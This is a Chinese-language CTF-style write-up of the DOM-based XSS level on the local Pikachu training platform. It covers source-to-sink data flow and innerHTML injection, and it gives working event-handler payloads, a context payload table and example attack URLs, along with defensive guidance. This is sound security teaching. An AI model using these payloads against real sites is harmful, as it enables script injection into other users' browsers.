---
layout: post
title: Pikachu - DOM型 XSS Writeup
platform: pikachu
date: 2026-10-26 22:20:00 +0800
categories: CTF
---

Pikachu - DOM型 XSS Writeup

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：Cross-Site Scripting → DOM型xss
- 地址：`http://localhost/pikachu/vul/xss/xss_dom.php`
- 题型：Web
- 考点：**DOM 型 XSS**、Source → Sink 数据流、上下文决定 payload

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4
pikachu 源码放在 D:\phpstudy_pro\WWW\pikachu\
```

**页面形态**：

```text
┌──────────────────────────────────────────┐
│  [                    ]  [click me!]     │
│                                          │
│  （空白区域，注入后的内容显示在这里）        │
└──────────────────────────────────────────┘
```

**✅ 实测结果**

```text
★ 服务端不参与（这是 DOM 型的判定依据）：

    带 payload 请求：
      xss_dom.php?text='><img src=x onerror=alert(1)>
      
    服务端返回的 HTML 里：
      payload 出现了吗      → False   ← ★ 服务端根本没输出它
      innerHTML 出现了吗     → True    ← 危险函数在前端
      拼接模板出现了吗        → True    ← "<a href='"+str+"'>"

★ 浏览器端（预期效果）：

    输入 hello
      → 页面出现链接 "what do you see?"（无刷新）

    输入 '><img src=x onerror=alert(1)>
      → 点 click me → 弹窗 "1"

    F5 刷新后 → 不再弹（因为没存储）
    Ctrl+U 看源代码 → 搜不到 payload（因为服务端没输出）
```

二、题目分析

**① PHP 部分：完全是个"假动作"**

```php
<?php
// xss_dom.php 第 21-23 行
if(isset($_GET['text'])){
    $haha = "这里是后台的处理逻辑";      // ★ 只是给变量赋值，什么也没做
}
?>
```

**★ 服务端收到了 `text` 参数，但只是赋个值，既不输出也不存储。**

**★ 这是 DOM 型 XSS 的关键特征：服务端代码干净，漏洞在前端。**

**② 真正的漏洞在 JavaScript（4 行）**

```html
<script>
    function domxss(){
        var str = document.getElementById("text").value;      // ① 取用户输入
        document.getElementById("dom").innerHTML =
            "<a href='"+str+"'>what do you see?</a>";         // ② 拼进 innerHTML
    }
</script>

<input id="text" name="text" type="text" value="" />
<input id="button" type="button" value="click me!" onclick="domxss()" />
<div id="dom"></div>
```

**★ 数据流**：

```
① document.getElementById("text").value   ← 【源 Source】用户输入
                    ↓
② "<a href='"+str+"'>"                    ← 【字符串拼接】上下文
                    ↓
③ element.innerHTML = ...                 ← 【汇 Sink】危险函数
                    ↓
   浏览器解析 HTML → 执行注入的标签/事件
```

**③ ⭐ 核心概念：Source（源）和 Sink（汇）**

**DOM 型 XSS 的判定公式**：

```
可控的【源】 数据  →  流经  →  危险的【汇】

★ 两个条件同时满足，才是 DOM 型 XSS
★ 不看服务端代码，只看前端 JS
```

**常见 Source（攻击者能控制的地方）**：

| Source | 例子 | 攻击者能控制吗 |
|---|---|---|
| `location.search` | `?a=xxx` | ✅ URL 里 |
| `location.hash` | `#xxx` | ✅ URL 里 |
| `location.pathname` | `/xxx/` | ✅ 路径里 |
| `document.referrer` | 来源页 | ✅ 可伪造 |
| `window.name` | 窗口名 | ✅ 可设置 |
| `document.cookie` | cookie | ⚠️ 需要先有 XSS |
| `postMessage` 数据 | 跨窗口消息 | ✅ 可发送 |
| `localStorage` / `sessionStorage` | 本地存储 | ⚠️ 需要先污染 |
| `<input>.value` | 表单输入 | ❌ **用户自己填的**（Self-XSS）|

**常见 Sink（危险函数）**：

| Sink | 危险程度 | 说明 |
|---|---|---|
| `innerHTML` | ⚠️ 高 | 插入 HTML，事件处理器会执行 |
| `outerHTML` | ⚠️ 高 | 同上 |
| `document.write()` / `writeln()` | ⚠️ 高 | 直接写入文档流 |
| `insertAdjacentHTML()` | ⚠️ 高 | 同上 |
| `eval()` | ⚠️⚠️ 极高 | 直接执行字符串代码 |
| `setTimeout("string")` | ⚠️ 高 | 字符串形式会当代码执行 |
| `new Function("string")` | ⚠️⚠️ 极高 | 构造函数 |
| `element.src = value` | ⚠️ 中 | 可被 `javascript:` 协议利用 |
| `element.href = value` | ⚠️ 中 | 同上 |
| `jQuery .html()` | ⚠️ 高 | 等价 innerHTML |
| `jQuery $()` | ⚠️ 高 | 可能执行 HTML |
| **`textContent`** | ✅ **安全** | 只当文本，不解析 HTML |
| **`innerText`** | ✅ **安全** | 同上 |
| **`createElement` + `textContent`** | ✅ **安全** | 推荐做法 |

**④ 本关的上下文：`<a href='PAYLOAD'>`**

**拼接模板**：

```javascript
"<a href='" + str + "'>what do you see?</a>"
              └┬┘
          这里插入你的输入，外面是【单引号】
```

**★ 所以要"闭合"两个东西**：

```
① 单引号 '   → 结束 href 属性值
② 尖括号 >   → 结束 <a> 标签
```

**输入 `hello` 时**：

```html
<a href='hello'>what do you see?</a>
```

**输入 `'><img src=x onerror=alert(1)>` 时**：

```html
<a href=''><img src=x onerror=alert(1)>'>what do you see?</a>
        └──┬──┘└──────────┬─────────┘
      空 href      注入的新标签（会执行）
                ↑
        最后那个多余的 ' 变成了纯文本，无害
```

**⑤ 作者把答案写在注释里了 😄**

```javascript
// xss_dom.php 第 52-53 行
//试试：'><img src="#" onmouseover="alert('xss')">
//试试：' onclick="alert('xss')">,闭合掉就行
```

**★ 两个 payload 都能用，区别是触发方式**：

```html
<!-- 方式 1：需要鼠标移上去（onmouseover） -->
'><img src="#" onmouseover="alert('xss')">

<!-- 方式 2：插入即触发（onerror，因为 src="#" 加载失败） -->
'><img src=x onerror=alert(1)>
```

**★ 真实攻击更常用方式 2**（不需要受害者额外操作）。

**⑥ ⚠️ 关键技术细节：innerHTML 里的 `<script>` 不执行**

**如果你试这个**：

```html
'><script>alert(1)</script>
```

**★ 不会弹窗。**

**原因（HTML5 规范）**：

```text
通过 innerHTML 插入的 <script> 标签【不会执行】

这是浏览器的安全设计：
    防止"页面动态插入 HTML 时意外执行脚本"

具体规则：
    · <script> 标签被插入 DOM，但不会执行
    · <script src="..."> 也不会加载
    · 事件处理器（onerror/onload/onclick）【会】执行
```

**★ 所以 DOM 型 XSS 的 payload 通常不用 `<script>`，而用事件处理器**：

```html
<img src=x onerror=alert(1)>           ← onerror 自动触发
<svg onload=alert(1)>                  ← onload 自动触发
<details open ontoggle=alert(1)>       ← ontoggle 自动触发
<body onload=alert(1)>                 ← 已存在 body，无效
<iframe src="javascript:alert(1)">     ← 有时被拦
```

**⑦ 这一关的"局限"：本质上是 Self-XSS**

**认真想一下**：

```text
漏洞点：从 <input id="text"> 取值 → innerHTML

问题：这个 input 是【使用者自己】填的
     攻击者怎么让受害者去填？

★ 所以这一关在真实场景里是"Self-XSS"（自伤型）
★ 只能自己 XSS 自己，没有实际危害
```

**★ 但这一关教的原理完全正确，只是"源"选得不好。**

**下一关（DOM型xss-x）的源就换成了 URL**：

```javascript
// xss_dom_x.php 第 49-51 行
var str = window.location.search;                        // ★ 源 = URL 查询串
var txss = decodeURIComponent(str.split("text=")[1]);    // ★ 解码
var xss = txss.replace(/\+/g,' ');                       // ★ 处理空格
document.getElementById("dom").innerHTML = "<a href='"+xss+"'>就让往事都随风...</a>";
```

**★ 那一关才能构造"恶意链接"发给别人。**

三、解题步骤

**第 1 步：打开页面**

```text
http://localhost/pikachu/vul/xss/xss_dom.php
```

**会看到**：

```
[                    ]  [click me!]

（下面是空的 div#dom）
```

**第 2 步：先看正常功能**

```text
① 输入框里填：hello
② 点 click me!
③ 页面出现一个链接：what do you see?
```

**★ 注意：页面没有刷新（地址栏没变）—— 这是纯 JS 操作。**

**第 3 步：作者给的第一个 payload（需要鼠标悬停）**

**输入框里填**：

```html
'><img src="#" onmouseover="alert('xss')">
```

**点 click me!**

**然后鼠标移到那个"裂图"图标上** → 弹窗 `xss`

**★ 为什么需要鼠标移上去？因为触发事件是 `onmouseover`。**

**第 4 步：换成"自动触发"的 payload**

**输入框里填**：

```html
'><img src=x onerror=alert(1)>
```

**点 click me!**

**★ 立刻弹窗 —— 因为 `src=x` 加载失败 → `onerror` 马上执行。**

**第 5 步：⭐ 验证"服务端完全没参与"**

**这是 DOM 型 XSS 最重要的验证（也是它和前两关的根本区别）。**

**验证 1：刷新后消失**

```text
① 输入 payload，点 click me → 弹窗
② 按 F5 刷新页面
③ 还有弹窗吗？
```

**结果**：

```
不弹了 ❌

★ 因为数据没有存储（对比存储型：刷新照样弹）
★ 也没有反射（对比反射型：URL 里没参数）
```

**验证 2：查看源代码看不到 payload**

```text
① 输入 payload，点 click me → 弹窗
② 按 Ctrl + U 查看网页源代码
③ Ctrl + F 搜 "img src=x" 或 "onerror"
```

**结果**：

```
搜不到 ✅

★ 因为服务端从来没有输出过 payload
★ 它只存在于浏览器的 DOM 里（JS 动态生成的）
```

**验证 3：服务端响应里没有 payload（命令行验证）**

**用脚本带 payload 请求页面**：

```python
import urllib.request, urllib.parse
payload = "'><img src=x onerror=alert(1)>"
url = "http://localhost/pikachu/vul/xss/xss_dom.php?text=" + urllib.parse.quote(payload)
with urllib.request.urlopen(url) as r:
    body = r.read().decode("utf-8", "replace")

print("payload 出现在响应里吗:", payload in body)      # False
print("innerHTML 出现了吗  :", "innerHTML" in body)   # True
```

**实测输出**：

```text
payload 出现在响应里吗: False      ← ★ 服务端没输出 payload
innerHTML 出现了吗  : True         ← ★ 危险函数在前端
```

**★ 这一组结果就是"DOM 型"的铁证**：

```
服务端响应是【固定的】
浏览器拿到固定响应后，用 JS 把 payload 插进去
→ 所以 WAF / 服务端过滤对它完全无效
```

**验证 4：网络面板没有新请求**

```text
① F12 → 网络 → 清空
② 输入 payload，点 click me
③ 看有没有新的请求
```

**结果**：

```
没有 ❌

★ 因为整个过程都在浏览器内完成
★ 只有最初加载页面那一次请求
```

**第 6 步：看看 DOM 里变成了什么样**

```text
① 输入 payload，点 click me
② F12 → 【元素】
③ 找到 <div id="dom">
④ 看到：
   <div id="dom">
       <a href=''><img src=x onerror=alert(1)>'>what do you see?</a>
   </div>
                └──────────┬──────────┘
                    注入的标签在这
```

**★ 看到这个，你就明白"闭合"是什么意思了。**

**第 7 步：思考"这在真实世界怎么利用"**

**本关的流程**：

```
用户输入框 → innerHTML
    ↑
攻击者无法控制（是受害者自己填的）
```

**★ 所以本关是 Self-XSS，没有实际攻击价值。**

**真实世界的 DOM 型 XSS 长这样**：

```javascript
// 危险写法 1：从 URL 取值
document.getElementById("msg").innerHTML = location.search.slice(1);

// 访问：http://site.com/page?a=<img src=x onerror=alert(1)>
// ★ 攻击者构造这个链接发给受害者，一点就中招

// 危险写法 2：从 hash 取值
document.getElementById("msg").innerHTML = location.hash.slice(1);

// 访问：http://site.com/page#<img src=x onerror=alert(1)>
// ★ hash 不会发送到服务端，服务端日志里都看不到

// 危险写法 3：jQuery 的 $()
$("#msg").html(location.hash);
```

**★ 下一关（DOM型xss-x）就是这个模式。**

四、延伸知识

**① 三种 XSS 的完整对比（第三列是本题）**

| | 反射型 | 存储型 | **DOM 型** |
|---|---|---|---|
| 漏洞代码在哪 | 服务端 PHP | 服务端 PHP | **浏览器 JS** |
| 恶意代码存哪 | URL 参数 | 数据库 | **DOM（内存）** |
| 服务端参与吗 | ✅ 输出 | ✅ 存储+输出 | ❌ **完全不参与** |
| 查看源代码能看到 payload | ✅ | ✅ | ❌ **看不到** |
| 刷新后还在吗 | ❌ | ✅ | ❌ |
| 服务端过滤有效吗 | ✅ | ✅ | ❌ **完全无效** |
| WAF 能拦吗 | ✅ | ✅ | ❌ **拦不住**（payload 不到服务端）|
| 危害 | ⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐ |

**★ DOM 型最特殊的地方**：

```text
它是唯一"服务端怎么防都没用"的 XSS

★ 因为请求到达服务端时，payload 根本不在里面
★ 服务端返回的是干净页面
★ 是浏览器自己把 payload 拼进去的
```

**② 为什么"服务端过滤"对 DOM 型无效**

```text
反射型 / 存储型：
    攻击者的 payload 必须【经过服务端】
    → PHP 可以用 htmlspecialchars 拦下来
    → WAF 可以在 HTTP 层面检测到

DOM 型（源 = URL 的 hash）：
    例：http://site.com/page#<img src=x onerror=alert(1)>
    
    ★ # 后面的内容【不会发送到服务器】
    ★ 服务端收到的请求是：GET /page
    ★ WAF 看到的也是干净的请求
    ★ 服务端返回干净页面
    ★ 浏览器拿到页面后，JS 从 location.hash 取值
    ★ 拼进 innerHTML → 执行
```

**★ 这就是"客户端漏洞"的本质**：

```
漏洞发生在【数据到达浏览器之后】
服务端对此一无所知
```

**③ Source（源）和 Sink（汇）的完整清单**

**Source —— 攻击者能控制的数据入口**：

```javascript
// 1. URL 相关（最常用）
location.href
location.search          // ?a=b
location.hash            // #xxx（不会发到服务端）
location.pathname        // /path
location.protocol
document.URL
document.documentURI
document.referrer        // 来源页

// 2. 浏览器存储
document.cookie
localStorage.getItem()
sessionStorage.getItem()
IndexedDB

// 3. 窗口通信
window.name
event.data（postMessage）
window.opener

// 4. 其他
document.forms[0].elements[0].value   // 表单输入（Self-XSS）
history.state
```

**Sink —— 危险的数据出口**：

```javascript
// 高危：直接执行代码
eval()
Function() / new Function()
setTimeout("code string")
setInterval("code string")
setImmediate()
execScript()

// 高危：插入 HTML
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
document.write() / document.writeln()
jQuery: .html() / .append() / .prepend() / .after() / .before() / $()

// 中危：URL 属性（可被 javascript: 利用）
element.src
element.href
element.action
element.formAction
location.href = value
location.assign(value)
location.replace(value)

// 低危（但仍需注意）
element.setAttribute('href', value)
element.setAttribute('src', value)
```

**安全的替代方案**：

```javascript
// ✅ 用 textContent 代替 innerHTML
element.textContent = userInput;          // 只当文本，不解析

// ✅ 用 createElement + textContent
const a = document.createElement('a');
a.href = sanitizeUrl(userInput);          // 先校验协议
a.textContent = userInput;
parent.appendChild(a);

// ✅ 必须用 innerHTML 时，先净化
element.innerHTML = DOMPurify.sanitize(userInput);
```

**④ 上下文相关的 payload（一张表记住）**

| 拼接位置 | 需要闭合 | payload 示例 |
|---|---|---|
| `<p>输入</p>` | 无 | `<script>alert(1)</script>` |
| `<a href='输入'>` | `'` + `>` | `'><img src=x onerror=alert(1)>` |
| `<a href="输入">` | `"` + `>` | `"><img src=x onerror=alert(1)>` |
| `<input value='输入'>` | `'` + `>` 或空格+事件 | `' onfocus=alert(1) autofocus='` |
| `<script>var x='输入'</script>` | `'` + `;` | `';alert(1);//` |
| `<script>var x="输入"</script>` | `"` + `;` | `";alert(1);//` |
| `<div onclick="func('输入')">` | `'` + `)` | `');alert(1);//` |
| `<a href="javascript:输入">` | 无（本身就在 JS 上下文）| `alert(1)` |
| `<style>...输入</style>` | `}` | `}body{background:red}`（CSS 注入，不算 XSS）|

**★ 核心原则**：

```
先看"你的输入落在什么位置"
→ 决定要闭合什么
→ 决定 payload 长什么样

★ 没有"万能 payload"
```

**⑤ 为什么"查看源代码"看不到 DOM 型 XSS 的 payload**

**两种"源代码"的区别**：

| | 查看源代码（Ctrl+U）| 元素面板（F12）|
|---|---|---|
| 看的是什么 | **服务器返回的原始 HTML** | **浏览器解析后的 DOM** |
| 会包含 JS 动态生成的内容吗 | ❌ 不会 | ✅ 会 |
| 能看到 DOM 型 XSS 的 payload 吗 | ❌ **看不到** | ✅ 看得到 |

**★ 这个区别非常重要**：

```
反射型 / 存储型：
    payload 在【服务端返回的 HTML】里
    → Ctrl+U 能看到

DOM 型：
    payload 在【浏览器动态生成的 DOM】里
    → Ctrl+U 看不到，只能 F12 元素里看
```

**★ 所以测 DOM 型 XSS 时，用"查看源代码"是无效的，必须用 DevTools 的元素面板。**

**⑥ 真实的 DOM 型 XSS 案例**

**案例 1：jQuery 的 `$()` 选择器**

```javascript
// 危险代码
var target = location.hash.slice(1);       // #messages
$(target).show();                          // jQuery 选择器

// 攻击：http://site.com/#<img src=x onerror=alert(1)>
// jQuery 会把字符串当 HTML 解析 → 执行
★ 这是 jQuery 历史上著名的漏洞（CVE-2020-11022/11023，修复于 jQuery 3.5.0）
```

**案例 2：信任 `postMessage`**

```javascript
// 危险代码
window.addEventListener('message', function(e) {
    document.getElementById('output').innerHTML = e.data;   // ★ 不校验来源
});

// 攻击：从任意页面 iframe 嵌入并 postMessage(payload)
```

**案例 3：SPA 路由参数**

```javascript
// 危险代码（React/Vue 之前的老式路由）
document.getElementById('content').innerHTML = getQueryParam('page');

// 攻击：http://site.com/app?page=<img src=x onerror=alert(1)>
```

**⑦ DOM 型 XSS 的防御**

**第一层：用安全的 API（最根本）**

```javascript
// ❌ 危险
element.innerHTML = userInput;

// ✅ 安全
element.textContent = userInput;
```

**第二层：必须插入 HTML 时，用净化库**

```javascript
// DOMPurify（最流行的 HTML 净化库）
const clean = DOMPurify.sanitize(userInput, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
});
element.innerHTML = clean;
```

**第三层：URL 参数校验**

```javascript
// 只接受白名单协议
function sanitizeHref(url) {
    const u = new URL(url, location.origin);
    if (!['http:', 'https:'].includes(u.protocol)) {
        return '#';    // 拒绝 javascript: / data: / vbscript:
    }
    return u.href;
}
```

**第四层：CSP（兜底）**

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'">
```

**★ 注意**：CSP 对内联事件处理器（`onerror=`）也有约束，但需要配合 `unsafe-inline` 的策略设置。

**第五层：Trusted Types（现代方案）**

```javascript
// Chrome 支持
// CSP: require-trusted-types-for 'script'
element.innerHTML = TrustedHTML.createHTML(cleanInput);
```

**⑧ DOM 型 XSS 的测试方法论**

**给一个页面，怎么判断有没有 DOM 型 XSS？**

```text
第 1 步：找 Source
    F12 → 全局搜索这些关键字：
        location.hash
        location.search
        location.href
        document.referrer
        innerHTML
        document.write
        eval
        postMessage

第 2 步：找数据流
    跟着变量的赋值链往下看

第 3 步：确认 Sink
    看这个数据最终传给了什么函数

第 4 步：构造 URL 验证
    在 URL 里放测试 payload，看是否执行

第 5 步：换用"可见效果"验证
    document.title=... / body 背景色
    （避免被弹窗压制误导）
```

**★ 快速检测技巧**：

```javascript
// 在控制台里检测所有可能的 Sink
// （仅用于自己测试的页面）
```

五、总结

- **本题核心：JS 里 `document.getElementById("text").value` → `innerHTML`，中间无任何过滤 → DOM 型 XSS。**

- **关键代码（4 行）**：

```javascript
function domxss(){
    var str = document.getElementById("text").value;         // 源
    document.getElementById("dom").innerHTML =
        "<a href='"+str+"'>what do you see?</a>";            // 汇
}
```

- **⭐ 五个必记要点**：

```text
① DOM 型 XSS = 源（可控数据）+ 汇（危险函数）
   → 漏洞在浏览器 JS 里，服务端完全不参与

② 服务端过滤对 DOM 型【完全无效】
   → payload 从来没到过服务器
   → WAF / htmlspecialchars 都拦不住

③ "查看源代码"看不到 payload
   → 必须用 F12 元素面板
   → 因为 payload 是浏览器动态生成的

④ innerHTML 里的 <script> 不执行
   → 要用事件处理器（onerror / onload / ontoggle）

⑤ payload 形状由上下文决定
   → 本关是 <a href='输入'>，所以要先闭合 ' 和 >
```

- **实测数据**：

```text
服务端响应（带 payload 请求）：
    payload 出现: False       ← 服务端没输出
    innerHTML 出现: True      ← 危险函数在前端

浏览器端：
    输入 hello        → 链接出现（无刷新）
    输入 '><img src=x onerror=alert(1)>  → 弹窗
    F5 刷新           → 不弹（无存储）
    Ctrl+U            → 搜不到 payload
    网络面板          → 无新请求
```

- **本关的局限（要能看出来）**：

```text
源是 <input> 的值 → 只能自己填 → Self-XSS
★ 真实场景要"源来自 URL"才有危害
★ 下一关（DOM型xss-x）就是 location.search 版本
```

- **XSS 模块进度**：

```text
✅ 反射型xss(get)      —— 直接拼接，需绕 maxlength
✅ 反射型xss(post)     —— 需登录 + 自动提交表单 + Pass-the-Hash
✅ 存储型xss           —— SQL 转义≠HTML 转义
✅ DOM型xss            —— 本题：源=input，汇=innerHTML
⬜ DOM型xss-x          —— 源=location.search（可构造恶意链接）
⬜ xss之盲打           —— 后台触发
⬜ xss之过滤           —— 绕过过滤
⬜ xss之htmlspecialchars —— 防护演示
⬜ xss之href输出        —— 属性上下文
⬜ xss之js输出          —— JS 上下文
```

**手工复现要点**：

```text
· 打开 xss_dom.php
· 输入 hello → 点 click me → 看链接（无刷新）
· 输入 '><img src=x onerror=alert(1)> → 弹窗
· F5 刷新 → 不弹（验证无存储）
· Ctrl+U → 搜不到 payload（验证服务端不参与）
· F12 元素 → 看到注入的 <img> 标签
· 换 '><script>alert(1)</script> → 不弹（innerHTML 限制）
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  DOM 型 XSS = 浏览器自己把危险数据拼进了危险函数              │
│                                                            │
│  判定公式：Source（可控源）→ Sink（危险汇）                  │
│                                                            │
│  ★ 服务端完全不知情 → 服务端防护全部失效                      │
│  ★ 查看源代码看不到 → 只能用 DevTools 看 DOM                 │
│  ★ innerHTML 不执行 <script> → 要事件处理器                  │
│  ★ payload 形状由上下文决定 → 先闭合再说                     │
└────────────────────────────────────────────────────────────┘
```
